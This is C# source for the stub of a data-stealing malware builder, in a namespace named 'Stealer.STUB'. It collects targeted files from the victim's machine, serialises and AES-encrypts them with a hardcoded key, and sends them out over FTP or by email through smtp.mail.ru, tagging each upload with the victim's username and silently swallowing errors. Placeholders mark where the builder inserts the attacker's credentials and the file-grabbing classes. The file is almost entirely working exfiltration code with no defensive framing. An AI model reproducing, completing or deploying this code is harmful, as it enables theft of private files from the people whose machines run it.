using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stealer.STUB
{
    public class Stub
    {
        private static List<AbstractFile> _filesList = new List<AbstractFile>();

        private static bool _sendViaFtp = false;
        private static bool _sendViaEmail = false;

        private static string _ftpUrl = @"[_ftpUrl]";
        private static string _ftpUser = @"[_ftpUser]";
        private static string _ftpPass = @"[_ftpPass]";

        private static string _emailFrom = "[_emailFrom]";
        private static string _emailPass = "[_emailPass]";
        private static string _emailTo = "[_emailTo]";

        public static void Main(string[] args)
        {
            
            DoJob();
            MessageBox.Show(@"Hello " + _filesList.Count);
        }

        private static void DoJob()
        {
            //[Add_toList]

            Dictionary<string, byte[]> _files = new Dictionary<string, byte[]>();
            foreach (AbstractFile targetFile in _filesList)
            {
                var data = targetFile.DoJob();
                if (data != null)
                {
                    _files.Add(targetFile.ToString(), data);
                }
            }

            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(memoryStream, _files);

                byte[] encodedBytes = Encrypt(memoryStream.ToArray());

                if (_sendViaFtp)
                {
                    SendViaFtp(encodedBytes);
                }
                if (_sendViaEmail)
                {
                    SendViaEmail(encodedBytes);
                }
            }
        }

        private static void SendViaFtp(byte[] data)
        {
            FtpWebRequest ftpWeb = (FtpWebRequest)WebRequest.Create(_ftpUrl 
                + Environment.UserName.ToLower().Trim()
                + "_"
                + Path.GetRandomFileName());

            ftpWeb.Method = WebRequestMethods.Ftp.UploadFile;
            ftpWeb.Credentials = new NetworkCredential(_ftpUser, _ftpPass);
            ftpWeb.ContentLength = data.Length;

            try
            {
                using (Stream stream = ftpWeb.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                using (FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWeb.GetResponse())
                {

                }
            }
            catch (Exception)
            {
                
            }
        }

        private static void SendViaEmail(byte[] data)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream(data))
                {
                    Attachment attachment = new Attachment(ms, Environment.UserName.Trim() + Path.GetRandomFileName());

                    MailMessage mail = new MailMessage()
                    {
                        From = new MailAddress(_emailFrom),
                        Subject = string.Format("Data from: {0}, date:{1}", Environment.UserName, DateTime.Now.ToShortDateString()),
                        Body = "Download attachment",
                        Sender = new MailAddress(_emailFrom),
                    };
                    mail.To.Add(new MailAddress(_emailTo));

                    mail.Attachments.Add(attachment);

                    SmtpClient smtpClient = new SmtpClient
                    {
                        Host = "smtp.mail.ru",
                        Port = 587,
                        UseDefaultCredentials = false,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        Credentials = new NetworkCredential(_emailFrom, _emailPass),
                        EnableSsl = true,
                        Timeout = 15000
                    };

                    smtpClient.Send(mail);
                    MessageBox.Show(@"mail Send");
                }
            }
            catch (Exception)
            {

            }
            finally
            {
                
            }
        }

        private static byte[] Key = { 123, 217, 19, 11, 24, 26, 85, 45, 114, 184, 27, 162, 37, 112, 222, 209, 241, 24, 175, 144, 173, 53, 196, 29, 24, 26, 17, 218, 131, 236, 53, 209 };
        private static byte[] Vector = { 146, 64, 191, 111, 23, 3, 113, 119, 231, 121, 221, 112, 79, 32, 114, 156 };

        public static byte[] Encrypt(byte[] data)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = Key;
            alg.IV = Vector;
            CryptoStream cs = new CryptoStream(ms,
            alg.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.Close();
            byte[] encryptedData = ms.ToArray();
            return encryptedData;
        }
    }

    abstract class AbstractFile
    {
        public byte[] DoJob()
        {
            return IsExist() ? GetFile() : null;
        }

        public abstract bool IsExist();
        public abstract byte[] GetFile();
    }

    //[Class]
}
